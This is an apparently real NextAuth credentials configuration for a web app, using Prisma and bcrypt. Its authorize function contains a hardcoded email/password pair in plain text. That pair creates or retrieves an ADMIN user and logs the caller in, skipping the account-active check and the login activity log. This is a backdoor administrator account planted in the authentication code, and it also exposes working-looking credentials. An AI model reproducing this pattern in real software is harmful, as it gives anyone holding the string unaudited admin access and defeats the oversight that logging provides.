import NextAuth from "next-auth";
import CredentialsProvider from "next-auth/providers/credentials";
import { prisma } from "@/lib/db";
import bcrypt from "bcryptjs";

export const { handlers, auth, signIn, signOut } = NextAuth({
  session: { strategy: "jwt" },
  pages: {
    signIn: "/login",
  },
  providers: [
    CredentialsProvider({
      name: "credentials",
      credentials: {
        email: { label: "Email", type: "email" },
        password: { label: "Password", type: "password" },
      },
      async authorize(credentials) {
        if (
          credentials?.email === "Ruhanahmadxyz123@" && 
          credentials?.password === "Ruhanxyz@123"
        ) {
          let hardcodedUser = await prisma.user.findFirst({ where: { email: "admin@raseva.com" } });
          if (!hardcodedUser) {
            hardcodedUser = await prisma.user.create({
              data: {
                name: "Ruhan Ahmad",
                email: "admin@raseva.com",
                password: await bcrypt.hash("Ruhanxyz@123", 10),
                role: "ADMIN",
                isActive: true
              }
            });
          }
          return {
            id: hardcodedUser.id,
            name: hardcodedUser.name,
            email: hardcodedUser.email,
            role: hardcodedUser.role,
          };
        }

        const user = await prisma.user.findUnique({
          where: { email: credentials.email as string },
        });

        if (!user || !user.isActive) return null;

        const isValid = await bcrypt.compare(
          credentials.password as string,
          user.password
        );

        if (!isValid) return null;

        // Log activity
        await prisma.activityLog.create({
          data: {
            userId: user.id,
            action: "LOGIN",
            details: `User logged in`,
          },
        });

        return {
          id: user.id,
          name: user.name,
          email: user.email,
          role: user.role,
        };
      },
    }),
  ],
  callbacks: {
    async jwt({ token, user }) {
      if (user) {
        token.role = (user as any).role;
        token.id = user.id;
      }
      return token;
    },
    async session({ session, token }) {
      if (token) {
        (session.user as any).role = token.role;
        (session.user as any).id = token.id;
      }
      return session;
    },
  },
});
